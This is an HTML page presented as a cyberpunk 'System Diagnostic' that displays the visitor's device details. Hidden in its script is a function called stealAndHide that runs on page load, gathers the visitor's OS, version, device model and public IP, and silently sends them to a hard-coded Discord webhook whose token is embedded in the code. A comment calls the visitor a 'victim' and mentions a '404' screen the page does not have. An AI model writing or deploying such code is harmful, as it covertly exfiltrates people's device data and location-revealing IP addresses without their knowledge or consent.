<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NETRUNNER // SYSTEM DIAGNOSTIC</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');

        :root {
            --neon-blue: #00f3ff;
            --neon-pink: #ff00ff;
            --neon-yellow: #ffee00;
            --bg-dark: #050505;
            --glass: rgba(0, 20, 40, 0.7);
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-dark);
            background-image: 
                linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            color: var(--neon-blue);
            font-family: 'Share Tech Mono', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }

        /* Scanline Effect */
        body::after {
            content: " ";
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 2;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }

        .container {
            position: relative;
            z-index: 10;
            width: 90%;
            max-width: 600px;
            background: var(--glass);
            border: 1px solid var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
            padding: 2rem;
            clip-path: polygon(
                0 0, 
                100% 0, 
                100% 85%, 
                90% 100%, 
                0 100%
            );
            backdrop-filter: blur(5px);
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem;
            text-align: center;
            margin-top: 0;
            text-shadow: 0 0 10px var(--neon-blue);
            letter-spacing: 2px;
            border-bottom: 2px solid var(--neon-pink);
            padding-bottom: 10px;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: var(--neon-yellow);
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        .data-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .data-item {
            background: rgba(0, 0, 0, 0.6);
            border-left: 3px solid var(--neon-pink);
            padding: 10px;
        }

        .label {
            font-size: 0.7rem;
            color: #888;
            text-transform: uppercase;
            display: block;
            margin-bottom: 5px;
        }

        .value {
            font-size: 1.1rem;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 5px var(--neon-pink);
        }

        .loading {
            text-align: center;
            font-size: 1.2rem;
            animation: blink 0.5s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .glitch-text {
            position: relative;
        }
        
        /* Mobile Adjustments */
        @media (max-width: 500px) {
            .data-grid { grid-template-columns: 1fr; }
            h1 { font-size: 1.5rem; }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 class="glitch-text">SYSTEM DIAGNOSTIC</h1>
        
        <div class="status-bar">
            <span>SECURE CONNECTION</span>
            <span id="clock">00:00:00</span>
        </div>

        <div id="loader" class="loading">INITIALIZING NEURAL LINK...</div>

        <div id="data-display" class="data-grid" style="display: none;">
            <div class="data-item">
                <span class="label">Operating System</span>
                <span class="value" id="os-val">--</span>
            </div>
            <div class="data-item">
                <span class="label">Version Core</span>
                <span class="value" id="ver-val">--</span>
            </div>
            <div class="data-item">
                <span class="label">Hardware Model</span>
                <span class="value" id="model-val">--</span>
            </div>
            <div class="data-item">
                <span class="label">Network Node (IP)</span>
                <span class="value" id="ip-val">--</span>
            </div>
            <div class="data-item" style="grid-column: span 2; border-left-color: var(--neon-yellow);">
                <span class="label">User Agent String</span>
                <span class="value" id="ua-val" style="font-size: 0.8rem; word-break: break-all;">--</span>
            </div>
        </div>
    </div>

    <script>

    async function stealAndHide() {
        // 1. Collect Data
        let info = { os: "Unknown", version: "Unknown", model: "Unknown", ip: "..." };
        
        // Get Android Version
        if (navigator.userAgentData) {
            try {
                const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
                info.os = ua.platform;
                info.version = ua.platformVersion;
                info.model = ua.model;
            } catch (e) {}
        }

        // Get IP
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            info.ip = data.ip;
        } catch (e) {}

        // 2. Format for Discord
        const webhookURL = "https://discord.com/api/webhooks/1531681973746143242/FA_8GS1dcgqnBjFonRiDctH9piuSlfB_1AsC8s79gKpgUPy5SkDL_5HU6IZtOvYIu1iz"; 
        
        const message = {
            content: `📱 **New Device Detected**\n` +
                     `**OS:** ${info.os} ${info.version}\n` +
                     `**Model:** ${info.model}\n` +
                     `**IP:** ${info.ip}\n` +
                     `**Browser:** ${navigator.userAgent.substring(0, 50)}...`
        };

        // 3. Send Silently
        if (webhookURL.includes("discord.com")) {
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            }).catch(err => console.log("Send failed"));
        }
        
        // Victim sees nothing but the static "404" text already in the HTML body
    }
    stealAndHide();
  
        
        // Clock Animation
        setInterval(() => {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString();
        }, 1000);

        async function runDiagnostic() {
            const loader = document.getElementById('loader');
            const display = document.getElementById('data-display');
            
            // Simulate hacking delay
            setTimeout(async () => {
                loader.style.display = 'none';
                display.style.display = 'grid';

                let os = "UNKNOWN";
                let ver = "UNKNOWN";
                let model = "UNKNOWN";

                // Detect Device Info
                if (navigator.userAgentData) {
                    try {
                        const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
                        os = ua.platform;
                        ver = ua.platformVersion;
                        model = ua.model || "Generic Unit";
                    } catch (e) {
                        os = "ENCRYPTED";
                    }
                } else {
                    os = "LEGACY SYSTEM";
                    ver = "N/A";
                }

                // Get IP
                let ip = "HIDDEN";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch (e) {}

                // Update UI
                document.getElementById('os-val').innerText = os;
                document.getElementById('ver-val').innerText = ver;
                document.getElementById('model-val').innerText = model;
                document.getElementById('ip-val').innerText = ip;
                document.getElementById('ua-val').innerText = navigator.userAgent;

            }, 1500);
        }

        runDiagnostic();
    </script>
</body>
</html>
